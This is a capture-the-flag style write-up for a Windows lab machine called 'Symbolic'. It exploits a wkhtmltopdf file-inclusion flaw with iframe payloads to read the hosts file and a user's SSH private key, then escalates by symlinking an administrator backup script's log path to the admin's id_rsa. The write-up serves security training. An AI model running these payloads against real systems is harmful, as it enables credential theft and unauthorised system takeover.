# Symbolic

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.202.177
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 20:55 +08
Nmap scan report for 192.168.202.177
Host is up (0.17s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

SSH was open on this machine, which was unusual for Windows.&#x20;

### WebPage to PDF -> LFI

Port 80 was rather simple:

<figure><img src="../../../.gitbook/assets/image (3029).png" alt=""><figcaption></figcaption></figure>

I created a HTML file with one word within it, then hosted it on my HTTP server and submitted the URL with my IP. This returned a PDF:

<figure><img src="../../../.gitbook/assets/image (1691).png" alt=""><figcaption></figcaption></figure>

I downloaded the PDF and used `exiftool` on it to enumerate any version:

```
$ exiftool ac354a9d4d469ef971709095540b2f42.pdf 
ExifTool Version Number         : 12.57
File Name                       : ac354a9d4d469ef971709095540b2f42.pdf
Directory                       : .
File Size                       : 6.6 kB
File Modification Date/Time     : 2023:07:06 21:03:17+08:00
File Access Date/Time           : 2023:07:06 21:03:17+08:00
File Inode Change Date/Time     : 2023:07:06 21:03:25+08:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : 
Creator                         : wkhtmltopdf 0.12.3
Producer                        : Qt 4.8.7
Create Date                     : 2023:07:06 06:02:52-07:00
Page Count                      : 1
```

Googling exploits for this version show that LFI is a possibility:

{% embed url="https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/" %}

{% embed url="https://www.jomar.fr/posts/2021/ssrf_through_pdf_generation/" %}

The exploit here is the content of the HTML file being used. Here's my PoC:

```html
<iframe src="C:/Windows/system32/drivers/etc/hosts">
```

When we host this HTML file on a HTTP server and use the website's converting feature, this is what we are returned:

<figure><img src="../../../.gitbook/assets/image (1918).png" alt=""><figcaption></figcaption></figure>

This confirms that LFI works. We can edit the PoC to show all the content:

```html
<iframe src="C:/Windows/system32/drivers/etc/hosts" height=1000 width=1000 />
```

<figure><img src="../../../.gitbook/assets/image (1692).png" alt=""><figcaption></figcaption></figure>

Now, we just need to find the correct file to read. The website gives us a username `p4yl0ad`, and SSH is open, so let's try to read the user's private key.

```markup
<iframe src="C:/users/p4yl0ad/.ssh/id_rsa" height=1000 width=1000 />
```

<figure><img src="../../../.gitbook/assets/image (4078).png" alt=""><figcaption></figcaption></figure>

Using this, we can `ssh` in as the user:

<figure><img src="../../../.gitbook/assets/image (3354).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Backup Script -> Symbolic Link Write

There was a `C:\backup` directory with a script in it:

```
p4yl0ad@SYMBOLIC C:\backup>dir 
 Volume in drive C has no label.
 Volume Serial Number is 5C30-DCD7

 Directory of C:\backup

03/10/2023  11:59 AM    <DIR>          .
03/10/2023  11:59 AM    <DIR>          ..
10/11/2021  09:11 PM               207 backup.ps1
07/06/2023  06:09 AM    <DIR>          logs

p4yl0ad@SYMBOLIC C:\backup>type backup.ps1 
$log = "C:\xampp\htdocs\logs\request.log" 
$backup = "C:\backup\logs"

while($true) {
        # Grabbing Backup
        copy $log $backup\$(get-date -f MM-dd-yyyy_HH_mm_s)
        Start-Sleep -s 60
}
```

There was a backup directory being updated, and this script was running once every minute or so. The script is also owned by the administrator:

```
p4yl0ad@SYMBOLIC C:\backup>icacls backup.ps1
backup.ps1 SYMBOLIC\Administrator:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Administrators:(I)(F)
           BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

We also have write access over `C:\xampp\htdocs\logs\request.log`, meaning that we can create a symbolic link to make the script read and copy any file we want. Again, since SSH is open, we can attempt to get the admin's private key.&#x20;

First we need to delete the `logs` directory:

```
p4yl0ad@SYMBOLIC C:\xampp\htdocs>del logs 
C:\xampp\htdocs\logs\*, Are you sure (Y/N)? y
```

We cannot create a symbolic link to the private SSH key using conventional means because we aren't given access:

```
p4yl0ad@SYMBOLIC C:\backup>powershell -c New-item -ItemType SymbolicLink -Path "C:/xampp/htdocs/logs/request.log" -T
arget "C:/users/administrator/.ssh/id_rsa"
New-item : Access is denied
At line:1 char:1
+ New-item -ItemType SymbolicLink -Path C:/xampp/htdocs/logs/request.lo ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\users\administrator\.ssh\id_rsa:String) [New-Item], Unauthoriz  
   edAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.NewItemCommand        
 
New-item : Cannot find path 'C:\users\administrator\.ssh\id_rsa' because it does not exist.
At line:1 char:1
+ New-item -ItemType SymbolicLink -Path C:/xampp/htdocs/logs/request.lo ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\users\administrator\.ssh\id_rsa:String) [New-Item], ItemNotFound  
   Exception
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemCommand
```

We can create a junction however:

```
p4yl0ad@SYMBOLIC C:\xampp\htdocs\logs>dir 
 Volume in drive C has no label. 
 Volume Serial Number is 5C30-DCD7

 Directory of C:\xampp\htdocs\logs

07/06/2023  06:22 AM    <DIR>          .
07/06/2023  06:22 AM    <DIR>          ..
07/06/2023  06:22 AM    <JUNCTION>     request.log [C:\Users\Administrator\.ssh\id_rsa]
```

But the above won't work. What worked was `CreateSymlink.exe` from this repo:

{% embed url="https://github.com/googleprojectzero/symboliclink-testing-tools" %}

We can download and upload that binary. Then, we can run it:

```
p4yl0ad@SYMBOLIC C:\Windows\Tasks>.\CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\users\administrator\.ss
h\id_rsa"
Opened Link \RPC Control\request.log -> \??\C:\users\administrator\.ssh\id_rsa: 00000174 
Press ENTER to exit and delete the symlink
```

I waited for a while and then deleted the symlink. When we check the `C:\backup\logs` directory's newest file that is significantly larger than the rest, we find an SSH key:

<figure><img src="../../../.gitbook/assets/image (2405).png" alt=""><figcaption></figcaption></figure>

Then, use this key to `ssh` in as the administrator:

<figure><img src="../../../.gitbook/assets/image (608).png" alt=""><figcaption></figcaption></figure>
